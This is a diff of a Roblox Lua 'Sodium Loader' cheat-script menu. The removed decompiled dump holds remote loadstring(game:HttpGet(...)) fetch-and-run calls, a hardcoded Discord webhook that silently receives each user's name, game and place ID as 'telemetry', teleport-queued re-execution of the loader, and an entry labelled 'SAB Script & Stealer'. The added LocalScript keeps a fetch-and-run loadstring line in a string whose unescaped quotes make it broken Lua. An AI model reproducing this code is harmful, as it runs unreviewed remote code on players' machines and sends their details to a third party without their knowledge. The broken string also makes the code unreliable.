@@ -1,794 +1,639 @@
-return {
-    protos = {
-        [0] = {
-            strings = {
-                [0] = "warn", -- x6
-                [1] = "tostring", -- x5
-                [2] = "GetPropertyChangedSignal",
-                [3] = "LocalPlayer", -- x3
-                [4] = "game", -- x9
-                [5] = "GetService", -- x8
-                [6] = "TweenService",
-                [7] = "TeleportService",
-                [8] = "MarketplaceService",
-                [9] = "ErrorMessageChanged",
-                [10] = "Connect", -- x2
-                [11] = "task", -- x2
-                [12] = "spawn", -- x2
-                [13] = "Wait",
-                [14] = "pcall", -- x8
-                [15] = "[Loader] Script is already running!",
-                [16] = "SodiumLoaded", -- x3
-                [17] = "[Loader] Failed to load Grow a Garden 2 script: ",
-                [18] = "GuiService",
-                [19] = "UserInputService",
-                [20] = "[Loader] Failed to load Blade Ball script: ",
-                [21] = "StarterGui",
-                [22] = "[Loader] Failed to load Steal a Brainrot script: ",
-                [23] = "Players",
-                [24] = "HttpService",
-                [25] = "[Loader] Failed to load default GUI: ",
-                [26] = "[Loader] Failed to load Adopt Me script: ",
-                [27] = "shared", -- x3
-                [28] = "InputBegan",
-                [29] = "Name",
-                [30] = "PlaceId",
-                [31] = "Unknown",
-            },
-            booleans = {
-                [0] = true, -- x7
-                [1] = false,
-            },
-            proto_references = {
-                [0] = { proto = 1 },
-                [1] = { proto = 2 },
-                [2] = { proto = 3 },
-                [3] = { proto = 4 },
-                [4] = { proto = 5 },
-                [5] = { proto = 6 },
-                [6] = { proto = 7 },
-                [7] = { proto = 8 },
-                [8] = { proto = 9 },
-                [9] = { proto = 10 },
-                [10] = { proto = 11 },
-                [11] = { proto = 12 },
-                [12] = { proto = 13 },
-                [13] = { proto = 14 },
-                [14] = { proto = 15 },
-                [15] = { proto = 16 },
-            },
-        },
-        [1] = {
-            parent = 0,
-            strings = {
-                [0] = "toclipboard", -- x2
-                [1] = "setclipboard", -- x2
-            },
-        },
-        [2] = {
-            parent = 0,
-            strings = {
-                [0] = "syn", -- x2
-                [1] = "pcall",
-                [2] = "queue_on_teleport", -- x2
-            },
-        },
-        [3] = {
-            parent = 0,
-            strings = {
-                [0] = "pcall",
-            },
-            proto_references = {
-                [0] = { proto = 17 },
-            },
-        },
-        [4] = {
-            parent = 0,
-            strings = {
-                [0] = "timestamp",
-                [1] = "embeds",
-                [2] = "pcall",
-                [3] = "inline", -- x3
-                [4] = "name", -- x3
-                [5] = "Place ID",
-                [6] = "tostring", -- x2
-                [7] = "value", -- x3
-                [8] = "JSONEncode",
-                [9] = "[Loader] Telemetry logging failed: ",
-                [10] = "fields",
-                [11] = "DateTime",
-                [12] = "now",
-                [13] = "ToIsoDate",
-                [14] = "title",
-                [15] = "Execution Log V2",
-                [16] = "color",
-                [17] = "User",
-                [18] = "Game",
-                [19] = "warn",
-            },
-            booleans = {
-                [0] = true, -- x3
-            },
-            proto_references = {
-                [0] = { proto = 18 },
-            },
-        },
-        [5] = {
-            parent = 0,
-            strings = {
-                [0] = "IgnoreGuiInset",
-                [1] = "DisplayOrder",
-                [2] = "Instance", -- x12
-                [3] = "new", -- x36
-                [4] = "Font", -- x4
-                [5] = "TextSize", -- x2
-                [6] = "ZIndex", -- x5
-                [7] = "Parent", -- x12
-                [8] = "FindFirstChild", -- x2
-                [9] = "SodiumSupportedGamesGui", -- x2
-                [10] = "TextColor3", -- x2
-                [11] = "Enum", -- x6
-                [12] = "ZIndexBehavior", -- x2
-                [13] = "Sibling",
-                [14] = "TextLabel", -- x2
-                [15] = "UDim2", -- x15
-                [16] = "ScreenGui",
-                [17] = "Color", -- x2
-                [18] = "Size", -- x9
-                [19] = "SodiumNoticeGui", -- x3
-                [20] = "Destroy", -- x3
-                [21] = "UIStroke",
-                [22] = "UICorner", -- x3
-                [23] = "BackgroundTransparency", -- x3
-                [24] = "Active", -- x2
-                [25] = "pcall",
-                [26] = "Color3", -- x9
-                [27] = "fromRGB", -- x9
-                [28] = "ColorSequenceKeypoint", -- x3
-                [29] = "WaitForChild",
-                [30] = "PlayerGui",
-                [31] = "UIGradient",
-                [32] = "task",
-                [33] = "spawn",
-                [34] = "Frame", -- x4
-                [35] = "Name", -- x3
-                [36] = "Blocker",
-                [37] = "Create", -- x2
-                [38] = "Position", -- x6
-                [39] = "EasingStyle", -- x2
-                [40] = "Back",
-                [41] = "CornerRadius", -- x3
-                [42] = "GothamMedium",
-                [43] = "TextWrapped",
-                [44] = "LineHeight",
-                [45] = "NoticeFrame",
-                [46] = "UDim", -- x3
-                [47] = "Linear",
-                [48] = "string",
-                [49] = "upper",
-                [50] = "TELEPORTING TO ",
-                [51] = "Completed", -- x2
-                [52] = "Wait", -- x2
-                [53] = "EasingDirection",
-                [54] = "Out",
-                [55] = "Text", -- x2
-                [56] = "The script has been copied to your clipboard.\n\nIf you get disconnected (Error Code: 773) because this game blocks teleports, please join the game manually and paste the script.",
-                [57] = "GothamBold",
-                [58] = "BackgroundColor3", -- x3
-                [59] = "BorderSizePixel", -- x3
-                [60] = "ResetOnSpawn",
-                [61] = "ColorSequence",
-                [62] = "Play", -- x2
-                [63] = "TweenInfo", -- x2
-                [64] = "Thickness",
-            },
-            booleans = {
-                [0] = true, -- x5
-                [1] = false, -- x2
-            },
-            proto_references = {
-                [0] = { proto = 19 },
-                [1] = { proto = 20 },
-            },
-        },
-        [6] = {
-            parent = 0,
-            strings = {
-                [0] = "Position", -- x11
-                [1] = "BackgroundTransparency", -- x5
-                [2] = "Text", -- x5
-                [3] = "TELEPORT QUEUE READY",
-                [4] = "Color3", -- x27
-                [5] = "fromRGB", -- x27
-                [6] = "TextColor3", -- x5
-                [7] = "Size", -- x11
-                [8] = "UDim2", -- x23
-                [9] = "new", -- x58
-                [10] = "Top",
-                [11] = "TextYAlignment", -- x2
-                [12] = "Enum", -- x16
-                [13] = "ScrollingFrame",
-                [14] = "Sibling",
-                [15] = "ZIndexBehavior", -- x2
-                [16] = "Instance", -- x18
-                [17] = "ColorSequenceKeypoint", -- x10
-                [18] = "SODIUM LOADER",
-                [19] = "Name", -- x7
-                [20] = "CloseButton",
-                [21] = "Frame", -- x3
-                [22] = "MainFrame",
-                [23] = "BorderSizePixel", -- x4
-                [24] = "ZIndex", -- x9
-                [25] = "Parent", -- x18
-                [26] = "Color", -- x4
-                [27] = "Murder Mystery 2",
-                [28] = "Universal MM2 GUI",
-                [29] = "BackgroundColor3", -- x4
-                [30] = "UIStroke", -- x2
-                [31] = "WaitForChild",
-                [32] = "PlayerGui",
-                [33] = "X",
-                [34] = "TextLabel", -- x4
-                [35] = "Font", -- x10
-                [36] = "GothamBold", -- x3
-                [37] = "Title",
-                [38] = "TweenInfo",
-                [39] = "EasingStyle",
-                [40] = "Back",
-                [41] = "AbsoluteContentSize", -- x2
-                [42] = "TextSize", -- x5
-                [43] = "TextXAlignment", -- x8
-                [44] = "Right",
-                [45] = "EasingDirection",
-                [46] = "Out",
-                [47] = "Create",
-                [48] = "https://raw.githubusercontent.com/Mm2script-maker/wwwwwwwww/refs/heads/main/wwwww", -- x4
-                [49] = "FindFirstChild",
-                [50] = "SodiumSupportedGamesGui", -- x3
-                [51] = "task", -- x2
-                [52] = "spawn", -- x2
-                [53] = "● EXECUTOR: ACTIVE",
-                [54] = "Play",
-                [55] = "MouseButton1Click",
-                [56] = "Connect", -- x4
-                [57] = "CornerRadius", -- x3
-                [58] = "Left", -- x3
-                [59] = "Thickness", -- x2
-                [60] = "ApplyStrokeMode", -- x2
-                [61] = "Y",
-                [62] = "MouseEnter",
-                [63] = "MouseLeave",
-                [64] = "UIGradient", -- x2
-                [65] = "ColorSequence", -- x2
-                [66] = "Border",
-                [67] = "Destroy",
-                [68] = "Steal a Brainrot",
-                [69] = "SAB Script & Stealer",
-                [70] = "GothamMedium",
-                [71] = "TextWrapped",
-                [72] = "UICorner", -- x3
-                [73] = "UDim", -- x4
-                [74] = "Adopt Me!",
-                [75] = "Sodium ADM Script",
-                [76] = "ScrollBarImageColor3",
-                [77] = "ScrollBarImageTransparency",
-                [78] = "UIListLayout",
-                [79] = "ResetOnSpawn",
-                [80] = "SortOrder", -- x2
-                [81] = "FooterFrame",
-                [82] = "GothamBlack",
-                [83] = "Padding",
-                [84] = "HorizontalAlignment", -- x2
-                [85] = "Center",
-                [86] = "Subtitle",
-                [87] = "https://pastefy.app/qE0iO0RV/raw",
-                [88] = "Active",
-                [89] = "Draggable",
-                [90] = "ScrollBarThickness",
-                [91] = "Blade Ball",
-                [92] = "BladeBall v1 Script",
-                [93] = "GamesList",
-                [94] = "ScreenGui",
-                [95] = "TextButton",
-                [96] = "Unsupported game! Select a supported game to teleport & auto-copy script:",
-                [97] = "LayoutOrder",
-                [98] = "CanvasSize",
-                [99] = "GetPropertyChangedSignal",
-                [100] = "Grow a Garden 2",
-                [101] = "GAG2 v1 Script",
-            },
-            booleans = {
-                [0] = true, -- x4
-                [1] = false,
-            },
-            proto_references = {
-                [0] = { proto = 21 },
-                [1] = { proto = 22 },
-                [2] = { proto = 23 },
-                [3] = { proto = 24 },
-                [4] = { proto = 25 },
-                [5] = { proto = 26 },
-                [6] = { proto = 27 },
-            },
-        },
-        [7] = {
-            parent = 0,
-            strings = {
-                [0] = "warn",
-                [1] = "tostring",
-                [2] = "pcall",
-                [3] = "[Loader] Failed to load alternate MM2 GUI: ",
-            },
-            proto_references = {
-                [0] = { proto = 28 },
-            },
-        },
-        [8] = {
-            parent = 0,
-        },
-        [9] = {
-            parent = 0,
-            strings = {
-                [0] = "loadstring",
-                [1] = "game",
-                [2] = "HttpGet",
-                [3] = "https://raw.githubusercontent.com/NathubV/dddddd/refs/heads/main/hhh",
-            },
-            booleans = {
-                [0] = true,
-            },
-        },
-        [10] = {
-            parent = 0,
-            strings = {
-                [0] = "loadstring",
-                [1] = "game",
-                [2] = "HttpGet",
-                [3] = "https://raw.githubusercontent.com/NathubV/dddddd/refs/heads/main/hhh",
-            },
-            booleans = {
-                [0] = true,
-            },
-        },
-        [11] = {
-            parent = 0,
-            strings = {
-                [0] = "Destroy",
-                [1] = "WaitForChild",
-                [2] = "PlayerGui",
-                [3] = "FindFirstChild",
-                [4] = "SodiumSupportedGamesGui",
-            },
-        },
-        [12] = {
-            parent = 0,
-            strings = {
-                [0] = "game",
-                [1] = "BindToClose",
-            },
-            proto_references = {
-                [0] = { proto = 29 },
-            },
-        },
-        [13] = {
-            parent = 0,
-            strings = {
-                [0] = "Escape",
-                [1] = "KeyCode", -- x2
-                [2] = "Enum",
-            },
-        },
-        [14] = {
-            parent = 0,
-            strings = {
-                [0] = "GetProductInfo",
-                [1] = "Name",
-            },
-        },
-        [15] = {
-            parent = 0,
-            strings = {
-                [0] = "https://raw.githubusercontent.com/NathubV/dddddd/refs/heads/main/hhh",
-                [1] = "loadstring",
-                [2] = "game",
-                [3] = "HttpGet",
-            },
-            booleans = {
-                [0] = true,
-            },
-        },
-        [16] = {
-            parent = 0,
-            strings = {
-                [0] = "loadstring",
-                [1] = "game",
-                [2] = "HttpGet",
-                [3] = "https://pastefy.app/qE0iO0RV/raw",
-            },
-        },
-        [17] = {
-            parent = 3,
-            strings = {
-                [0] = "pcall", -- x2
-                [1] = "math",
-                [2] = "random",
-                [3] = "Disconnect",
-                [4] = "TeleportInitFailed",
-                [5] = "Connect",
-                [6] = "https://raw.githubusercontent.com/NathubV/dddddd/refs/heads/main/hhh", -- x2
-            },
-            proto_references = {
-                [0] = { proto = 30 },
-                [1] = { proto = 31 },
-                [2] = { proto = 32 },
-            },
-        },
-        [18] = {
-            parent = 4,
-            strings = {
-                [0] = "Body",
-                [1] = "Method",
-                [2] = "POST",
-                [3] = "Content-Type",
-                [4] = "application/json",
-                [5] = "Headers",
-                [6] = "request", -- x2
-                [7] = "Url",
-                [8] = "https://discord.com/api/webhooks/1546811433415614536/DjCsUFLDF4MkP6BJrbY8kYwyxulXJFDvlz47uH6HRDIQZ1-rs3qkl28zkSl5bdgnRwI0", -- x2
-                [9] = "PostAsync",
-            },
-        },
-        [19] = {
-            parent = 5,
-            strings = {
-                [0] = "Rotation",
-                [1] = "task",
-                [2] = "wait",
-            },
-        },
-        [20] = {
-            parent = 5,
-            strings = {
-                [0] = "CoreGuiType",
-                [1] = "All",
-                [2] = "SetCoreGuiEnabled",
-                [3] = "Enum",
-            },
-            booleans = {
-                [0] = false,
-            },
-        },
-        [21] = {
-            parent = 6,
-            strings = {
-                [0] = "new", -- x24
-                [1] = "TextSize", -- x3
-                [2] = "ZIndex", -- x6
-                [3] = "Parent", -- x11
-                [4] = "Instance", -- x11
-                [5] = "UICorner", -- x3
-                [6] = "UDim", -- x3
-                [7] = "fromRGB", -- x6
-                [8] = "BackgroundColor3", -- x3
-                [9] = "BorderSizePixel", -- x2
-                [10] = "UIStroke", -- x2
-                [11] = "Color3", -- x6
-                [12] = "TextColor3", -- x3
-                [13] = "Size", -- x6
-                [14] = "BackgroundTransparency", -- x3
-                [15] = "Text", -- x4
-                [16] = "",
-                [17] = "Frame", -- x2
-                [18] = "CornerRadius", -- x3
-                [19] = "Left", -- x2
-                [20] = "TextXAlignment", -- x4
-                [21] = "TextButton", -- x2
-                [22] = "Color", -- x2
-                [23] = "Enum", -- x5
-                [24] = "Font", -- x6
-                [25] = "GothamBold", -- x2
-                [26] = "Position", -- x4
-                [27] = "UDim2", -- x10
-                [28] = "TextLabel", -- x2
-                [29] = "MouseButton1Click",
-                [30] = "Connect", -- x5
-                [31] = "Name", -- x2
-                [32] = "Indicator",
-                [33] = "JOIN",
-                [34] = "Thickness", -- x2
-                [35] = "MouseEnter", -- x2
-                [36] = "MouseLeave", -- x2
-                [37] = "GothamMedium",
-                [38] = "JoinButton",
-            },
-            proto_references = {
-                [0] = { proto = 33 },
-                [1] = { proto = 34 },
-                [2] = { proto = 35 },
-                [3] = { proto = 36 },
-                [4] = { proto = 37 },
-            },
-        },
-        [22] = {
-            parent = 6,
-            strings = {
-                [0] = "task",
-                [1] = "wait",
-                [2] = "Rotation",
-            },
-        },
-        [23] = {
-            parent = 6,
-            strings = {
-                [0] = "CanvasSize",
-                [1] = "UDim2",
-                [2] = "new",
-                [3] = "AbsoluteContentSize",
-                [4] = "Y",
-            },
-        },
-        [24] = {
-            parent = 6,
-            strings = {
-                [0] = "Connect",
-                [1] = "Enum", -- x2
-                [2] = "EasingStyle",
-                [3] = "Back",
-                [4] = "Play",
-                [5] = "Completed",
-                [6] = "Position",
-                [7] = "TweenInfo",
-                [8] = "new", -- x3
-                [9] = "Create",
-                [10] = "UDim2", -- x2
-                [11] = "Size",
-                [12] = "EasingDirection",
-                [13] = "In",
-            },
-            booleans = {
-                [0] = false,
-            },
-            proto_references = {
-                [0] = { proto = 38 },
-            },
-        },
-        [25] = {
-            parent = 6,
-            strings = {
-                [0] = "Color3", -- x3
-                [1] = "fromRGB", -- x3
-                [2] = "TextColor3",
-                [3] = "BackgroundColor3",
-                [4] = "new", -- x2
-                [5] = "Create", -- x2
-                [6] = "TweenInfo", -- x2
-                [7] = "Color",
-                [8] = "Play", -- x2
-            },
-        },
-        [26] = {
-            parent = 6,
-            strings = {
-                [0] = "BackgroundColor3",
-                [1] = "Color3", -- x3
-                [2] = "fromRGB", -- x3
-                [3] = "Create", -- x2
-                [4] = "TweenInfo", -- x2
-                [5] = "Color",
-                [6] = "Play", -- x2
-                [7] = "new", -- x2
-                [8] = "TextColor3",
-            },
-        },
-        [27] = {
-            parent = 6,
-            strings = {
-                [0] = "Offset",
-                [1] = "task",
-                [2] = "wait",
-                [3] = "Vector2",
-                [4] = "new",
-            },
-        },
-        [28] = {
-            parent = 7,
-            strings = {
-                [0] = "loadstring",
-                [1] = "game",
-                [2] = "HttpGet",
-                [3] = "https://raw.githubusercontent.com/NathubV/dddddd/refs/heads/main/hhh",
-            },
-        },
-        [29] = {
-            parent = 12,
-            strings = {
-                [0] = "task",
-                [1] = "wait",
-            },
-        },
-        [30] = {
-            parent = 17,
-            strings = {
-                [0] = "Teleport",
-                [1] = "game",
-                [2] = "PlaceId",
-            },
-        },
-        [31] = {
-            parent = 17,
-            strings = {
-                [0] = "Teleport",
-            },
-        },
-        [32] = {
-            parent = 17,
-            strings = {
-                [0] = "pcall",
-                [1] = "Disconnect",
-            },
-            proto_references = {
-                [0] = { proto = 39 },
-            },
-        },
-        [33] = {
-            parent = 21,
-            strings = {
-                [0] = "Size",
-                [1] = "Position",
-                [2] = "Play",
-                [3] = "task", -- x2
-                [4] = "delay",
-                [5] = "UDim2", -- x2
-                [6] = "new", -- x3
-                [7] = "Create",
-                [8] = "TweenInfo",
-                [9] = "spawn",
-            },
-            proto_references = {
-                [0] = { proto = 40 },
-                [1] = { proto = 41 },
-            },
-        },
-        [34] = {
-            parent = 21,
-            strings = {
-                [0] = "Play", -- x2
-                [1] = "Create", -- x2
-                [2] = "new", -- x2
-                [3] = "Color3", -- x2
-                [4] = "fromRGB", -- x2
-                [5] = "BackgroundColor3",
-                [6] = "TextColor3",
-                [7] = "TweenInfo", -- x2
-                [8] = "Color",
-            },
-        },
-        [35] = {
-            parent = 21,
-            strings = {
-                [0] = "Color3", -- x2
-                [1] = "fromRGB", -- x2
-                [2] = "Play", -- x3
-                [3] = "Create", -- x3
-                [4] = "TweenInfo", -- x3
-                [5] = "new", -- x5
-                [6] = "Position",
-                [7] = "UDim2", -- x2
-                [8] = "Color",
-                [9] = "BackgroundColor3",
-                [10] = "Size",
-            },
-        },
-        [36] = {
-            parent = 21,
-            strings = {
-                [0] = "Color",
-                [1] = "Create", -- x3
-                [2] = "Color3", -- x2
-                [3] = "fromRGB", -- x2
-                [4] = "Play", -- x3
-                [5] = "BackgroundColor3",
-                [6] = "TweenInfo", -- x3
-                [7] = "new", -- x5
-                [8] = "Size",
-                [9] = "UDim2", -- x2
-                [10] = "Position",
-            },
-        },
-        [37] = {
-            parent = 21,
-            strings = {
-                [0] = "Color",
-                [1] = "Color3",
-                [2] = "fromRGB",
-                [3] = "TextColor3",
-                [4] = "Play", -- x2
-                [5] = "Create", -- x2
-                [6] = "TweenInfo", -- x2
-                [7] = "new", -- x2
-                [8] = "BackgroundColor3",
-            },
-        },
-        [38] = {
-            parent = 24,
-            strings = {
-                [0] = "Destroy",
-            },
-        },
-        [39] = {
-            parent = 32,
-            strings = {
-                [0] = "Teleport",
-                [1] = "game",
-                [2] = "PlaceId",
-            },
-        },
-        [40] = {
-            parent = 33,
-            strings = {
-                [0] = "Create",
-                [1] = "TweenInfo",
-                [2] = "new", -- x3
-                [3] = "UDim2", -- x2
-                [4] = "Size",
-                [5] = "Position",
-                [6] = "Play",
-            },
-        },
-        [41] = {
-            parent = 33,
-            strings = {
-                [0] = "pcall",
-                [1] = "Kick",
-                [2] = "This game doesn't allow joining other games. You can join manually. The script has been copied to your clipboard so you don't lose it.",
-                [3] = "TeleportInitFailed",
-                [4] = "Connect",
-                [5] = "Disconnect",
-                [6] = "\"))()",
-                [7] = "loadstring(game:HttpGet(\"",
-                [8] = "\nend)\nif not ok then warn(\"Queued loader failed: \" .. tostring(err)) end\n",
-                [9] = "repeat task.wait() until game:IsLoaded()\nlocal plr = game:GetService(\"Players\").LocalPlayer\nrepeat task.wait() until plr and plr:FindFirstChild(\"PlayerGui\")\ntask.wait(3)\nlocal ok, err = pcall(function()\n    ",
-            },
-            proto_references = {
-                [0] = { proto = 42 },
-                [1] = { proto = 43 },
-                [2] = { proto = 44 },
-            },
-        },
-        [42] = {
-            parent = 41,
-            strings = {
-                [0] = "Teleport",
-            },
-        },
-        [43] = {
-            parent = 41,
-            strings = {
-                [0] = "pcall",
-            },
-            proto_references = {
-                [0] = { proto = 45 },
-            },
-        },
-        [44] = {
-            parent = 41,
-            strings = {
-                [0] = "Disconnect",
-                [1] = "Kick",
-                [2] = "This game doesn't allow joining other games. You can join manually. The script has been copied to your clipboard so you don't lose it.",
-            },
-        },
-        [45] = {
-            parent = 43,
-            strings = {
-                [0] = "SetCoreGuiEnabled",
-                [1] = "Enum",
-                [2] = "CoreGuiType",
-                [3] = "All",
-            },
-            booleans = {
-                [0] = true,
-            },
-        },
-    },
+--// SODIUM LOADER
+--// Roblox Studio LocalScript
+--// Put in StarterPlayer > StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local old = playerGui:FindFirstChild("SodiumLoader")
+if old then
+	old:Destroy()
+end
+
+--==================================================
+-- CONFIG
+--==================================================
+
+local SCRIPT_LINK = "loadstring(game:HttpGet("https://raw.githubusercontent.com/NathubV/Mm2Premium/refs/heads/main/loader"))()"
+
+local GAMES = {
+	{
+		Name = "Murder Mystery 2",
+		Description = "Universal MM2 GUI",
+		Color = Color3.fromRGB(255, 55, 65),
+		PlaceId = 142823291
+	},
+	{
+		Name = "Adopt Me!",
+		Description = "Sodium ADM Script",
+		Color = Color3.fromRGB(35, 180, 245),
+		PlaceId = 920587237
+	},
+	{
+		Name = "Grow a Garden",
+		Description = "GAG Script",
+		Color = Color3.fromRGB(45, 230, 110),
+		PlaceId = 126884695634066
+	},
+	{
+		Name = "Blade Ball",
+		Description = "BladeBall Script",
+		Color = Color3.fromRGB(245, 150, 35),
+		PlaceId = 13772394625
+	}
 }
+
+--==================================================
+-- COLORS
+--==================================================
+
+local BG = Color3.fromRGB(10, 10, 14)
+local PANEL = Color3.fromRGB(18, 18, 24)
+local BUTTON = Color3.fromRGB(24, 24, 32)
+local TEXT = Color3.fromRGB(238, 238, 242)
+local SUBTEXT = Color3.fromRGB(145, 145, 155)
+local PURPLE = Color3.fromRGB(185, 50, 245)
+local GREEN = Color3.fromRGB(45, 230, 110)
+
+--==================================================
+-- GUI
+--==================================================
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "PREMIUM SCRIPT KEYLESS"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = playerGui
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.fromOffset(590, 585)
+main.Position = UDim2.fromScale(0.5, 0.5)
+main.AnchorPoint = Vector2.new(0.5, 0.5)
+main.BackgroundColor3 = BG
+main.BorderSizePixel = 0
+main.Parent = gui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 14)
+mainCorner.Parent = main
+
+--==================================================
+-- DRAGGABLE HEADER
+--==================================================
+
+local dragArea = Instance.new("Frame")
+dragArea.Name = "DragArea"
+dragArea.BackgroundTransparency = 1
+dragArea.Position = UDim2.fromOffset(0, 3)
+dragArea.Size = UDim2.new(1, -65, 0, 82)
+dragArea.Active = true
+dragArea.ZIndex = 5
+dragArea.Parent = main
+
+local dragging = false
+local dragStart
+local startPosition
+
+dragArea.InputBegan:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragging = true
+		dragStart = input.Position
+		startPosition = main.Position
+
+		input.Changed:Connect(function()
+
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+
+		end)
+
+	end
+
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+
+	if not dragging then
+		return
+	end
+
+	if input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch then
+
+		local delta = input.Position - dragStart
+
+		main.Position = UDim2.new(
+			startPosition.X.Scale,
+			startPosition.X.Offset + delta.X,
+			startPosition.Y.Scale,
+			startPosition.Y.Offset + delta.Y
+		)
+
+	end
+
+end)
+
+--==================================================
+-- TOP ACCENT
+--==================================================
+
+local accent = Instance.new("Frame")
+accent.Size = UDim2.new(1, 0, 0, 3)
+accent.BackgroundColor3 = PURPLE
+accent.BorderSizePixel = 0
+accent.ZIndex = 2
+accent.Parent = main
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 80, 220)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(230, 20, 150)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 30, 220))
+})
+gradient.Parent = accent
+
+--==================================================
+-- TITLE
+--==================================================
+
+local title = Instance.new("TextLabel")
+title.BackgroundTransparency = 1
+title.Position = UDim2.fromOffset(26, 28)
+title.Size = UDim2.new(1, -100, 0, 34)
+title.Font = Enum.Font.GothamBold
+title.Text = "PREMIUM SCRIPT KEYLESS"
+title.TextSize = 27
+title.TextColor3 = Color3.fromRGB(225, 55, 205)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 6
+title.Parent = main
+
+--==================================================
+-- SUBTITLE
+--==================================================
+
+local subtitle = Instance.new("TextLabel")
+subtitle.BackgroundTransparency = 1
+subtitle.Position = UDim2.fromOffset(27, 61)
+subtitle.Size = UDim2.new(1, -60, 0, 24)
+subtitle.Font = Enum.Font.Gotham
+subtitle.Text = "Select a supported game to continue:"
+subtitle.TextSize = 13
+subtitle.TextColor3 = SUBTEXT
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.ZIndex = 6
+subtitle.Parent = main
+
+--==================================================
+-- CLOSE
+--==================================================
+
+local close = Instance.new("TextButton")
+close.Name = "Close"
+close.Size = UDim2.fromOffset(43, 43)
+close.Position = UDim2.new(1, -53, 0, 23)
+close.BackgroundColor3 = Color3.fromRGB(24, 19, 25)
+close.BorderSizePixel = 0
+close.Text = "X"
+close.Font = Enum.Font.GothamBold
+close.TextSize = 17
+close.TextColor3 = Color3.fromRGB(255, 55, 65)
+close.AutoButtonColor = false
+close.ZIndex = 10
+close.Parent = main
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 12)
+closeCorner.Parent = close
+
+close.MouseEnter:Connect(function()
+	close.BackgroundColor3 = Color3.fromRGB(38, 22, 28)
+end)
+
+close.MouseLeave:Connect(function()
+	close.BackgroundColor3 = Color3.fromRGB(24, 19, 25)
+end)
+
+close.MouseButton1Click:Connect(function()
+	gui:Destroy()
+end)
+
+--==================================================
+-- GAME LIST
+--==================================================
+
+local scroll = Instance.new("ScrollingFrame")
+scroll.Name = "GameList"
+scroll.Position = UDim2.fromOffset(26, 108)
+scroll.Size = UDim2.new(1, -52, 1, -188)
+scroll.BackgroundTransparency = 1
+scroll.BorderSizePixel = 0
+scroll.ScrollBarThickness = 3
+scroll.ScrollBarImageColor3 = Color3.fromRGB(65, 65, 75)
+scroll.CanvasSize = UDim2.new()
+scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scroll.Parent = main
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 13)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = scroll
+
+--==================================================
+-- BOTTOM DIVIDER
+--==================================================
+
+local divider = Instance.new("Frame")
+divider.Size = UDim2.new(1, 0, 0, 1)
+divider.Position = UDim2.new(0, 0, 1, -78)
+divider.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
+divider.BorderSizePixel = 0
+divider.Parent = main
+
+local status = Instance.new("TextLabel")
+status.BackgroundTransparency = 1
+status.Position = UDim2.fromOffset(20, -1)
+status.Size = UDim2.fromOffset(190, 76)
+status.Font = Enum.Font.GothamBold
+status.Text = "● SYSTEM: READY"
+status.TextSize = 11
+status.TextColor3 = GREEN
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = divider
+
+local queue = Instance.new("TextLabel")
+queue.BackgroundTransparency = 1
+queue.Position = UDim2.new(1, -230, 0, 0)
+queue.Size = UDim2.fromOffset(210, 76)
+queue.Font = Enum.Font.GothamBold
+queue.Text = "TELEPORT READY"
+queue.TextSize = 11
+queue.TextColor3 = Color3.fromRGB(75, 145, 255)
+queue.TextXAlignment = Enum.TextXAlignment.Right
+queue.Parent = divider
+
+--==================================================
+-- TELEPORT SCREEN
+--==================================================
+
+local function showTeleportScreen(gameData)
+
+	scroll.Visible = false
+	title.Visible = false
+	subtitle.Visible = false
+	close.Visible = false
+	divider.Visible = false
+	dragArea.Visible = false
+
+	local screen = Instance.new("Frame")
+	screen.Name = "TeleportScreen"
+	screen.Size = UDim2.fromScale(1, 1)
+	screen.BackgroundColor3 = BG
+	screen.BorderSizePixel = 0
+	screen.ZIndex = 20
+	screen.Parent = main
+
+	local screenCorner = Instance.new("UICorner")
+	screenCorner.CornerRadius = UDim.new(0, 14)
+	screenCorner.Parent = screen
+
+	--==================================================
+	-- SCREEN ACCENT
+	--==================================================
+
+	local screenAccent = Instance.new("Frame")
+	screenAccent.Size = UDim2.new(1, 0, 0, 3)
+	screenAccent.BackgroundColor3 = gameData.Color
+	screenAccent.BorderSizePixel = 0
+	screenAccent.ZIndex = 21
+	screenAccent.Parent = screen
+
+	--==================================================
+	-- HEADING
+	--==================================================
+
+	local heading = Instance.new("TextLabel")
+	heading.BackgroundTransparency = 1
+	heading.Position = UDim2.fromOffset(20, 45)
+	heading.Size = UDim2.new(1, -40, 0, 30)
+	heading.Font = Enum.Font.GothamBold
+	heading.Text = "TELEPORTING TO"
+	heading.TextSize = 18
+	heading.TextColor3 = gameData.Color
+	heading.TextXAlignment = Enum.TextXAlignment.Center
+	heading.ZIndex = 22
+	heading.Parent = screen
+
+	local gameHeading = Instance.new("TextLabel")
+	gameHeading.BackgroundTransparency = 1
+	gameHeading.Position = UDim2.fromOffset(20, 76)
+	gameHeading.Size = UDim2.new(1, -40, 0, 35)
+	gameHeading.Font = Enum.Font.GothamBold
+	gameHeading.Text = string.upper(gameData.Name)
+	gameHeading.TextSize = 22
+	gameHeading.TextColor3 = TEXT
+	gameHeading.TextXAlignment = Enum.TextXAlignment.Center
+	gameHeading.ZIndex = 22
